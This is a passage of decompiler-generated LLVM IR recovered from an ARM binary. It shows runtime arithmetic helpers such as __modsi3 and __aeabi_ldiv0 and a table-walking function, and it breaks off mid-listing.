  br label %bb81

bb81:                                             ; preds = %dec_label_pc_14174, %bb80
  %v2_14194 = add i32 %v1_14180.v6_14180.v6_14188.v6_14190, -1
  %v4_14194 = sub i32 0, %v1_14180.v6_14180.v6_14188.v6_14190
  %v5_14194 = and i32 %v1_14180.v6_14180.v6_14188.v6_14190, %v4_14194
  %v3_14198 = udiv i32 %v3_1419812, 16
  %v5_1419c = icmp slt i32 %v1_14180.v6_14180.v6_14188.v6_14190, 1
  br i1 %v5_1419c, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_1419c = add i32 %v6_1419c, -4
  %v9_1419c = sub i32 3, %v6_1419c
  %v10_1419c = and i32 %v9_1419c, %v6_1419c
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_141a4 = phi i32 [ %v6_1419c, %bb81 ], [ %v7_1419c, %bb82 ]
  %v0_141a015.in = phi i32 [ %v2_14194, %bb81 ], [ %v7_1419c, %bb82 ]
  %v1_141a014.in = phi i32 [ %v5_14194, %bb81 ], [ %v10_1419c, %bb82 ]
  %v1_141a014 = icmp slt i32 %v1_141a014.in, 0
  %v0_141a015 = icmp slt i32 %v0_141a015.in, 0
  %v2_141a0 = xor i1 %v0_141a015, %v1_141a014
  br i1 %v2_141a0, label %dec_label_pc_141a4, label %dec_label_pc_14174

dec_label_pc_141a4:                               ; preds = %bb83
  %v1_141a4 = urem i32 %v0_141a4, 4
  %v2_141a4 = icmp eq i32 %v1_141a4, 0
  br i1 %v2_141a4, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_141a4
  %v3_141a8 = icmp eq i32 %v1_14180.v6_14180.v6_14188.v6_14190, 0
  br i1 %v3_141a8, label %bb76, label %dec_label_pc_141b0

dec_label_pc_141b0:                               ; preds = %bb84, %dec_label_pc_1416c
  %v0_141c4 = phi i32 [ %v3_14198, %bb84 ], [ %v1_14160, %dec_label_pc_1416c ]
  %v1_141c0 = phi i32 [ %v1_14180.v6_14180.v6_14188.v6_14190, %bb84 ], [ %v1_1412c, %dec_label_pc_1416c ]
  %v0_141b0 = phi i32 [ %v0_141a4, %bb84 ], [ %v2_1416c, %dec_label_pc_1416c ]
  %v5_141b4 = icmp slt i32 %v0_141b0, -2
  br i1 %v5_141b4, label %dec_label_pc_141d4, label %dec_label_pc_141b8

dec_label_pc_141b8:                               ; preds = %dec_label_pc_141b0
  %v8_141b0 = icmp eq i32 %v0_141b0, -2
  br i1 %v8_141b0, label %dec_label_pc_141c8, label %dec_label_pc_141bc

dec_label_pc_141bc:                               ; preds = %dec_label_pc_141b8
  %v3_141bc = icmp ult i32 %v1_141c0, %v0_141c4
  br i1 %v3_141bc, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_141bc
  %v2_141bc = sub i32 %v1_141c0, %v0_141c4
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_141bc, %bb85
  %v0_141c852 = phi i32 [ %v1_141c0, %dec_label_pc_141bc ], [ %v2_141bc, %bb85 ]
  %v3_141c4 = udiv i32 %v0_141c4, 2
  br label %dec_label_pc_141c8

dec_label_pc_141c8:                               ; preds = %dec_label_pc_141b8, %bb86
  %v0_141d0 = phi i32 [ %v0_141c4, %dec_label_pc_141b8 ], [ %v3_141c4, %bb86 ]
  %v1_141cc = phi i32 [ %v1_141c0, %dec_label_pc_141b8 ], [ %v0_141c852, %bb86 ]
  %v3_141c8 = icmp ult i32 %v1_141cc, %v0_141d0
  br i1 %v3_141c8, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_141c8
  %v2_141c8 = sub i32 %v1_141cc, %v0_141d0
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_141c8, %bb87
  %v0_141d455 = phi i32 [ %v1_141cc, %dec_label_pc_141c8 ], [ %v2_141c8, %bb87 ]
  %v3_141d0 = udiv i32 %v0_141d0, 2
  br label %dec_label_pc_141d4

dec_label_pc_141d4:                               ; preds = %dec_label_pc_141b0, %bb88
  %v2_141d8 = phi i32 [ %v0_141c4, %dec_label_pc_141b0 ], [ %v3_141d0, %bb88 ]
  %v1_141d8 = phi i32 [ %v1_141c0, %dec_label_pc_141b0 ], [ %v0_141d455, %bb88 ]
  %v3_141d4 = icmp ult i32 %v1_141d8, %v2_141d8
  br i1 %v3_141d4, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_141d4
  %v2_141d4 = sub i32 %v1_141d8, %v2_141d8
  br label %bb76

dec_label_pc_141e0:                               ; preds = %entry
  %v0_141e0 = load i32, i32* @lr, align 4
  %v0_141e4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_141e0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_141d8, { 1, 2, 0 }
  uselistorder i32 %v0_141c4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_141a4, { 1, 0, 2 }
  uselistorder i32 %v7_1419c, { 1, 0 }
  uselistorder i32 %v3_14198, { 1, 0 }
  uselistorder i32 %v1_14180.v6_14180.v6_14188.v6_14190, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_1418c, { 1, 0 }
  uselistorder i32 %v4_14184, { 1, 0 }
  uselistorder i32 %v4_1417c, { 1, 0 }
  uselistorder i32 %v6_1419c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_1416c, { 1, 0 }
  uselistorder i32 %v1_14160, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_1414c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_14158.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1412c, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_141d4, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_141c8, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_14174, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_141f0 = icmp eq i32 %arg2, 0
  br i1 %v2_141f0, label %dec_label_pc_142c4, label %dec_label_pc_141f8

dec_label_pc_141f8:                               ; preds = %entry
  %v1_141f0 = icmp slt i32 %arg2, 0
  br i1 %v1_141f0, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_141f8
  %v2_141f8 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_141f8, %bb
  %v4_14210 = phi i32 [ %arg2, %dec_label_pc_141f8 ], [ %v2_141f8, %bb ]
  %v0_141fc = load i32, i32* @r0, align 4
  %v1_141fc = icmp slt i32 %v0_141fc, 0
  br i1 %v1_141fc, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_14200 = sub i32 0, %v0_141fc
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_14208 = phi i32 [ %v0_141fc, %bb79 ], [ %v2_14200, %bb80 ]
  %v1_14204 = add i32 %v4_14210, -1
  %v7_14204 = icmp eq i32 %v4_14210, 1
  br i1 %v7_14204, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_14208 = icmp eq i32 %v1_14208, %v4_14210
  br i1 %v10_14208, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_14208 = icmp ult i32 %v1_14208, %v4_14210
  br i1 %v4_14208, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_14210 = and i32 %v1_14204, %v4_14210
  %v8_14210 = icmp eq i32 %v6_14210, 0
  br i1 %v8_14210, label %.thread72, label %dec_label_pc_14220.preheader

dec_label_pc_14220.preheader:                     ; preds = %bb84
  %v2_14220109 = icmp ugt i32 %v4_14210, 268435455
  br i1 %v2_14220109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_1421464 = phi i32 [ %v1_14208, %bb84 ], [ 0, %.thread70 ]
  %v3_14214 = and i32 %v1_1421464, %v1_14204
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_14220.preheader
  %v0_14234.pr35.lcssa = phi i32 [ %v4_14210, %dec_label_pc_14220.preheader ], [ %v4_14228, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_14220.preheader ], [ %v2_1422c9, %.thread2.thread7 ]
  br label %dec_label_pc_14234thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_14220.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_1422c9, %.thread2.thread7 ], [ 0, %dec_label_pc_14220.preheader ]
  %v0_14234.pr35110 = phi i32 [ %v4_14228, %.thread2.thread7 ], [ %v4_14210, %dec_label_pc_14220.preheader ]
  %v4_14224 = icmp ult i32 %v0_14234.pr35110, %v1_14208
  br i1 %v4_14224, label %bb86, label %dec_label_pc_14234thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_14228 = and i32 %v0_14234.pr35110, 268435456
  %v3_14228 = icmp eq i32 %v2_14228, 0
  %v4_14228 = mul i32 %v0_14234.pr35110, 16
  br i1 %v3_14228, label %.thread2.thread7, label %dec_label_pc_14234.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_1422c9 = add i32 %storemerge111, 4
  %v2_14220 = icmp ugt i32 %v4_14228, 268435455
  br i1 %v2_14220, label %.thread1, label %bb85

dec_label_pc_14234thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_14234thread-pre-split.loopexit

dec_label_pc_14234thread-pre-split.loopexit:      ; preds = %dec_label_pc_14234thread-pre-split.loopexit.loopexit, %.thread1
  %v0_14234.pr35108 = phi i32 [ %v0_14234.pr35.lcssa, %.thread1 ], [ %v0_14234.pr35110, %dec_label_pc_14234thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_14234thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14234thread-pre-split

dec_label_pc_14234thread-pre-split:               ; preds = %.thread4, %dec_label_pc_14234thread-pre-split.loopexit
  %v1_1424041 = phi i32 [ %storemerge105, %dec_label_pc_14234thread-pre-split.loopexit ], [ %v2_14240, %.thread4 ]
  %v2_1423836 = phi i32 [ %v1_14208, %dec_label_pc_14234thread-pre-split.loopexit ], [ %v2_14238, %.thread4 ]
  %v0_14234.pr = phi i32 [ %v0_14234.pr35108, %dec_label_pc_14234thread-pre-split.loopexit ], [ %v3_1423c, %.thread4 ]
  br label %dec_label_pc_14234

dec_label_pc_14234.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_14234

dec_label_pc_14234:                               ; preds = %dec_label_pc_14234.loopexit, %dec_label_pc_14234thread-pre-split
  %v0_14248.pr = phi i32 [ %v1_1424041, %dec_label_pc_14234thread-pre-split ], [ %storemerge111, %dec_label_pc_14234.loopexit ]
  %v2_14238 = phi i32 [ %v2_1423836, %dec_label_pc_14234thread-pre-split ], [ %v1_14208, %dec_label_pc_14234.loopexit ]
  %v1_1423c = phi i32 [ %v0_14234.pr, %dec_label_pc_14234thread-pre-split ], [ %v4_14228, %dec_label_pc_14234.loopexit ]
  %v2_14234 = icmp slt i32 %v1_1423c, 0
  br i1 %v2_14234, label %dec_label_pc_14248, label %bb87

bb87:                                             ; preds = %dec_label_pc_14234
  %v4_14238 = icmp ult i32 %v1_1423c, %v2_14238
  br i1 %v4_14238, label %.thread4, label %dec_label_pc_14248

.thread4:                                         ; preds = %bb87
  %v3_1423c = mul i32 %v1_1423c, 2
  %v2_14240 = add i32 %v0_14248.pr, 1
  br label %dec_label_pc_14234thread-pre-split

dec_label_pc_14248:                               ; preds = %bb87, %dec_label_pc_14234
  %v2_14248 = add i32 %v0_14248.pr, -3
  %v5_1424c = icmp slt i32 %v0_14248.pr, 3
  br i1 %v5_1424c, label %dec_label_pc_1428c, label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %dec_label_pc_14248, %bb91
  %v6_14278 = phi i32 [ %v0_14280, %bb91 ], [ %v2_14248, %dec_label_pc_14248 ]
  %v1_14254 = phi i32 [ %v1_1425c.v6_1425c.v6_14264.v6_1426c, %bb91 ], [ %v2_14238, %dec_label_pc_14248 ]
  %v3_1427410 = phi i32 [ %v3_14274, %bb91 ], [ %v1_1423c, %dec_label_pc_14248 ]
  %v3_14250 = icmp ult i32 %v1_14254, %v3_1427410
  %v3_14254 = select i1 %v3_14250, i32 0, i32 %v3_1427410
  %v1_1425c = sub i32 %v1_14254, %v3_14254
  %v4_14258 = udiv i32 %v3_1427410, 2
  %v6_14258 = icmp ult i32 %v1_1425c, %v4_14258
  %v6_1425c = select i1 %v6_14258, i32 0, i32 %v4_14258
  %v1_1425c.v6_1425c = sub i32 %v1_1425c, %v6_1425c
  %.demorgan = and i1 %v3_14250, %v6_14258
  %v4_14260 = udiv i32 %v3_1427410, 4
  %v6_14260 = icmp ult i32 %v1_1425c.v6_1425c, %v4_14260
  %v6_14264 = select i1 %v6_14260, i32 0, i32 %v4_14260
  %v1_1425c.v6_1425c.v6_14264 = sub i32 %v1_1425c.v6_1425c, %v6_14264
  %.demorgan76 = and i1 %.demorgan, %v6_14260
  %v4_14268 = udiv i32 %v3_1427410, 8
  %v6_14268 = icmp ult i32 %v1_1425c.v6_1425c.v6_14264, %v4_14268
  %v6_1426c = select i1 %v6_14268, i32 0, i32 %v4_14268
  %v1_1425c.v6_1425c.v6_14264.v6_1426c = sub i32 %v1_1425c.v6_1425c.v6_14264, %v6_1426c
  %.demorgan77 = and i1 %.demorgan76, %v6_14268
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_14250
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_14250, %bb88
  %v2_14270 = add i32 %v1_1425c.v6_1425c.v6_14264.v6_1426c, -1
  %v4_14270 = sub i32 0, %v1_1425c.v6_1425c.v6_14264.v6_1426c
  %v5_14270 = and i32 %v1_1425c.v6_1425c.v6_14264.v6_1426c, %v4_14270
  %v3_14274 = udiv i32 %v3_1427410, 16
  %v5_14278 = icmp slt i32 %v1_1425c.v6_1425c.v6_14264.v6_1426c, 1
  br i1 %v5_14278, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_14278 = add i32 %v6_14278, -4
  %v9_14278 = sub i32 3, %v6_14278
  %v10_14278 = and i32 %v9_14278, %v6_14278
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_14280 = phi i32 [ %v6_14278, %bb89 ], [ %v7_14278, %bb90 ]
  %v0_1427c13.in = phi i32 [ %v2_14270, %bb89 ], [ %v7_14278, %bb90 ]
  %v1_1427c12.in = phi i32 [ %v5_14270, %bb89 ], [ %v10_14278, %bb90 ]
  %v1_1427c12 = icmp slt i32 %v1_1427c12.in, 0
  %v0_1427c13 = icmp slt i32 %v0_1427c13.in, 0
  %v2_1427c = xor i1 %v0_1427c13, %v1_1427c12
  br i1 %v2_1427c, label %dec_label_pc_14280, label %dec_label_pc_14250

dec_label_pc_14280:                               ; preds = %bb91
  %v1_14280 = urem i32 %v0_14280, 4
  %v2_14280 = icmp eq i32 %v1_14280, 0
  br i1 %v2_14280, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_14280
  %v3_14284 = icmp eq i32 %v1_1425c.v6_1425c.v6_14264.v6_1426c, 0
  br i1 %v3_14284, label %.thread6, label %dec_label_pc_1428c

dec_label_pc_1428c:                               ; preds = %bb92, %dec_label_pc_14248
  %v0_142a0 = phi i32 [ %v3_14274, %bb92 ], [ %v1_1423c, %dec_label_pc_14248 ]
  %v1_1429c = phi i32 [ %v1_1425c.v6_1425c.v6_14264.v6_1426c, %bb92 ], [ %v2_14238, %dec_label_pc_14248 ]
  %v0_1428c = phi i32 [ %v0_14280, %bb92 ], [ %v2_14248, %dec_label_pc_14248 ]
  %v5_14290 = icmp slt i32 %v0_1428c, -2
  br i1 %v5_14290, label %dec_label_pc_142b0, label %dec_label_pc_14294

dec_label_pc_14294:                               ; preds = %dec_label_pc_1428c
  %v8_1428c = icmp eq i32 %v0_1428c, -2
  br i1 %v8_1428c, label %dec_label_pc_142a4, label %dec_label_pc_14298

dec_label_pc_14298:                               ; preds = %dec_label_pc_14294
  %v3_14298 = icmp ult i32 %v1_1429c, %v0_142a0
  br i1 %v3_14298, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_14298
  %v2_14298 = sub i32 %v1_1429c, %v0_142a0
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_14298, %bb93
  %v0_142a454 = phi i32 [ %v1_1429c, %dec_label_pc_14298 ], [ %v2_14298, %bb93 ]
  %v3_142a0 = udiv i32 %v0_142a0, 2
  br label %dec_label_pc_142a4

dec_label_pc_142a4:                               ; preds = %dec_label_pc_14294, %bb94
  %v0_142ac = phi i32 [ %v0_142a0, %dec_label_pc_14294 ], [ %v3_142a0, %bb94 ]
  %v1_142a8 = phi i32 [ %v1_1429c, %dec_label_pc_14294 ], [ %v0_142a454, %bb94 ]
  %v3_142a4 = icmp ult i32 %v1_142a8, %v0_142ac
  br i1 %v3_142a4, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_142a4
  %v2_142a4 = sub i32 %v1_142a8, %v0_142ac
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_142a4, %bb95
  %v0_142b057 = phi i32 [ %v1_142a8, %dec_label_pc_142a4 ], [ %v2_142a4, %bb95 ]
  %v3_142ac = udiv i32 %v0_142ac, 2
  br label %dec_label_pc_142b0

dec_label_pc_142b0:                               ; preds = %dec_label_pc_1428c, %bb96
  %v2_142b4 = phi i32 [ %v0_142a0, %dec_label_pc_1428c ], [ %v3_142ac, %bb96 ]
  %v1_142b4 = phi i32 [ %v1_1429c, %dec_label_pc_1428c ], [ %v0_142b057, %bb96 ]
  %v3_142b0 = icmp ult i32 %v1_142b4, %v2_142b4
  br i1 %v3_142b0, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_142b0
  %v2_142b0 = sub i32 %v1_142b4, %v2_142b4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_142b0, %bb83, %.thread72, %dec_label_pc_14280, %bb92, %bb97
  %v1_142bc = phi i32 [ %v1_1425c.v6_1425c.v6_14264.v6_1426c, %dec_label_pc_14280 ], [ 0, %bb92 ], [ %v1_142b4, %dec_label_pc_142b0 ], [ %v2_142b0, %bb97 ], [ %v3_14214, %.thread72 ], [ %v1_14208, %bb83 ]
  br i1 %v1_141fc, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_142bc = sub i32 0, %v1_142bc
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_142c0 = phi i32 [ %v1_142bc, %.thread6 ], [ %v2_142bc, %bb98 ]
  ret i32 %v1_142c0

dec_label_pc_142c4:                               ; preds = %entry
  %v0_142c4 = load i32, i32* @lr, align 4
  %v0_142c8 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_142c4)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_142a0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_14280, { 1, 0, 2 }
  uselistorder i32 %v7_14278, { 1, 0 }
  uselistorder i32 %v3_14274, { 1, 0 }
  uselistorder i32 %v1_1425c.v6_1425c.v6_14264.v6_1426c, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_14268, { 1, 0 }
  uselistorder i32 %v4_14260, { 1, 0 }
  uselistorder i32 %v4_14258, { 1, 0 }
  uselistorder i32 %v6_14278, { 3, 0, 2, 1 }
  uselistorder i32 %v2_14248, { 1, 0 }
  uselistorder i32 %v1_1423c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_14238, { 1, 0, 3, 2 }
  uselistorder i32 %v4_14228, { 1, 0, 3, 2 }
  uselistorder i32 %v0_14234.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14208, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_14210, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 2, 1, 0 }
  uselistorder i32* @lr, { 6, 7, 8, 2, 3, 0, 4, 1, 5 }
  uselistorder i32 -2, { 0, 5, 1, 6, 2, 3, 13, 14, 15, 4, 12, 11, 10, 9, 8, 7 }
  uselistorder i32 8, { 3, 4, 41, 13, 5, 6, 12, 7, 46, 32, 18, 47, 33, 19, 48, 34, 20, 8, 9, 10, 60, 35, 49, 11, 36, 21, 22, 50, 23, 51, 24, 52, 25, 53, 26, 54, 27, 55, 28, 56, 29, 57, 30, 58, 37, 59, 0, 1, 61, 62, 63, 64, 40, 65, 66, 38, 67, 2, 14, 15, 68, 16, 17, 69, 39, 43, 44, 70, 71, 73, 72, 74, 75, 42, 45, 31, 76, 77 }
  uselistorder i32 3, { 27, 2, 28, 3, 49, 29, 38, 15, 4, 16, 46, 39, 5, 42, 17, 18, 19, 0, 40, 41, 20, 6, 21, 7, 22, 8, 43, 44, 23, 9, 24, 10, 12, 11, 25, 13, 26, 14, 45, 1, 47, 48, 30, 34, 31, 35, 32, 36, 33, 37 }
  uselistorder i32 2, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 77, 9, 10, 11, 12, 13, 31, 30, 19, 20, 80, 32, 81, 26, 33, 102, 34, 35, 36, 37, 89, 90, 38, 98, 78, 79, 95, 40, 82, 42, 83, 84, 39, 43, 85, 14, 15, 16, 44, 41, 45, 46, 47, 86, 87, 48, 88, 49, 91, 21, 24, 92, 93, 94, 100, 101, 51, 50, 53, 52, 55, 54, 96, 56, 27, 57, 97, 58, 28, 60, 59, 62, 61, 64, 63, 66, 65, 99, 67, 25, 103, 22, 68, 104, 105, 29, 106, 75, 107, 69, 108, 70, 71, 109, 72, 110, 73, 111, 74, 112, 23, 113, 17, 18, 76, 114 }
  uselistorder i32 4, { 1, 2, 45, 3, 4, 46, 167, 168, 91, 5, 6, 92, 67, 48, 141, 142, 38, 130, 129, 128, 100, 105, 102, 93, 41, 40, 39, 94, 7, 8, 9, 10, 11, 12, 95, 34, 96, 35, 97, 98, 99, 13, 14, 68, 49, 69, 70, 79, 101, 15, 71, 50, 51, 52, 53, 54, 72, 103, 55, 104, 73, 56, 57, 58, 59, 74, 60, 61, 62, 63, 80, 106, 107, 16, 81, 108, 109, 17, 82, 110, 111, 18, 83, 112, 113, 19, 84, 114, 115, 20, 116, 85, 117, 118, 21, 86, 119, 120, 22, 87, 121, 122, 23, 88, 123, 124, 24, 89, 125, 126, 25, 143, 127, 131, 132, 133, 134, 135, 136, 26, 137, 138, 0, 139, 90, 140, 144, 164, 78, 145, 66, 146, 147, 47, 148, 75, 149, 150, 151, 152, 64, 153, 76, 154, 155, 156, 65, 157, 77, 158, 27, 28, 29, 159, 160, 44, 43, 42, 161, 30, 31, 32, 33, 162, 36, 163, 37, 165, 166 }
  uselistorder i32 16, { 1, 2, 3, 4, 5, 15, 6, 7, 0, 8, 9, 31, 21, 28, 17, 10, 11, 14, 27, 12, 32, 13, 18, 30, 16, 29, 22, 23, 24, 25, 19, 20, 33, 34, 35, 36, 37, 26, 38, 39, 40, 41, 42 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_142b0, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_142a4, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_14250, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_142d4 = load i32, i32* @r0, align 4
  ret i32 %v1_142d4
}

define i32 @function_142d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_142d8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_142dc = load i32, i32* @global_var_1cb68.647, align 4
  %v7_142e0 = icmp eq i32 %v3_142dc, -1
  %v3_142e4 = load i32, i32* @r4, align 4
  store i32 %v3_142e4, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1cb68.647 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_142e0, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_142d8
  store i32 %v3_142e4, i32* %r4.global-to-local, align 4
  %v9_142ec = load i32, i32* @r0, align 4
  ret i32 %v9_142ec

.preheader:                                       ; preds = %dec_label_pc_142d8, %.preheader
  %v0_142f4 = phi i32 [ %v3_142f8, %.preheader ], [ %v3_142dc, %dec_label_pc_142d8 ]
  call void @__pseudo_branch(i32 %v0_142f4)
  %v0_142f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_142f8 = add i32 %v0_142f8, -4
  %v2_142f8 = inttoptr i32 %v1_142f8 to i32*
  %v3_142f8 = load i32, i32* %v2_142f8, align 4
  store i32 %v1_142f8, i32* %r4.global-to-local, align 4
  %v3_142fc = icmp eq i32 %v3_142f8, -1
  br i1 %v3_142fc, label %dec_label_pc_14304, label %.preheader

dec_label_pc_14304:                               ; preds = %.preheader
  %v2_14304 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14304, i32* %r4.global-to-local, align 4
  %v8_14304 = load i32, i32* @r0, align 4
  ret i32 %v8_14304

; uselistorder directives
  uselistorder i32 %v3_142f8, { 1, 0 }
  uselistorder i32 %v3_142dc, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 4, 0, 2, 1, 3 }
  uselistorder i32 -4, { 11, 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32 -1, { 51, 0, 52, 53, 54, 55, 56, 57, 58, 59, 1, 2, 3, 4, 33, 34, 5, 60, 61, 111, 30, 6, 62, 109, 63, 110, 37, 105, 35, 106, 7, 8, 36, 107, 9, 10, 38, 108, 11, 12, 13, 14, 15, 64, 24, 25, 26, 27, 28, 29, 16, 31, 17, 18, 19, 20, 21, 65, 22, 66, 67, 68, 69, 23, 32, 112, 113, 44, 114, 42, 115, 43, 116, 40, 117, 70, 71, 72, 73, 74, 45, 118, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 39, 119, 46, 120, 101, 102, 103, 104, 41, 121, 47, 122, 48, 49, 50 }
  uselistorder i32 1, { 282, 94, 196, 494, 495, 197, 496, 497, 159, 498, 396, 397, 398, 163, 399, 285, 284, 283, 131, 139, 134, 135, 137, 136, 133, 132, 138, 0, 400, 401, 402, 403, 141, 140, 1, 404, 405, 406, 407, 167, 408, 409, 168, 410, 350, 351, 352, 230, 286, 14, 13, 12, 10, 11, 411, 174, 175, 2, 3, 412, 413, 415, 414, 231, 416, 113, 112, 383, 77, 417, 418, 419, 16, 15, 17, 420, 287, 121, 115, 118, 117, 119, 122, 120, 116, 114, 421, 422, 288, 48, 47, 46, 45, 49, 50, 423, 424, 289, 110, 109, 108, 107, 111, 382, 232, 153, 152, 154, 151, 150, 377, 378, 379, 380, 233, 381, 290, 105, 103, 104, 97, 96, 100, 102, 101, 99, 95, 98, 234, 340, 192, 341, 169, 344, 345, 342, 343, 161, 160, 162, 346, 235, 347, 294, 293, 292, 291, 274, 52, 56, 53, 59, 55, 60, 58, 54, 57, 295, 61, 370, 170, 369, 187, 296, 23, 24, 22, 20, 19, 26, 27, 18, 21, 25, 361, 362, 363, 236, 298, 297, 82, 84, 92, 79, 81, 78, 91, 83, 89, 90, 93, 80, 85, 86, 88, 87, 299, 336, 337, 201, 237, 239, 238, 240, 338, 241, 242, 243, 245, 244, 246, 247, 200, 199, 198, 339, 248, 311, 310, 309, 275, 308, 276, 307, 306, 305, 304, 303, 277, 302, 301, 300, 73, 75, 76, 74, 348, 312, 249, 349, 250, 164, 251, 358, 5, 353, 252, 354, 4, 355, 188, 356, 165, 166, 357, 359, 189, 360, 317, 316, 315, 278, 314, 279, 313, 71, 72, 373, 202, 374, 203, 375, 6, 376, 7, 8, 364, 367, 365, 366, 319, 318, 51, 320, 204, 205, 253, 368, 254, 207, 206, 280, 67, 69, 68, 255, 208, 209, 210, 256, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 371, 222, 257, 321, 142, 147, 145, 148, 144, 146, 149, 143, 425, 70, 372, 123, 322, 28, 384, 258, 387, 259, 388, 389, 385, 386, 390, 391, 392, 393, 171, 394, 172, 124, 128, 130, 125, 126, 127, 129, 395, 176, 260, 323, 65, 66, 64, 63, 62, 426, 106, 427, 264, 183, 428, 262, 184, 263, 429, 177, 430, 182, 431, 267, 185, 191, 265, 186, 266, 432, 178, 433, 434, 229, 435, 436, 437, 224, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 225, 450, 451, 452, 453, 454, 194, 455, 268, 456, 269, 270, 457, 458, 459, 460, 461, 226, 462, 463, 464, 179, 465, 227, 466, 467, 468, 180, 469, 228, 470, 471, 472, 181, 473, 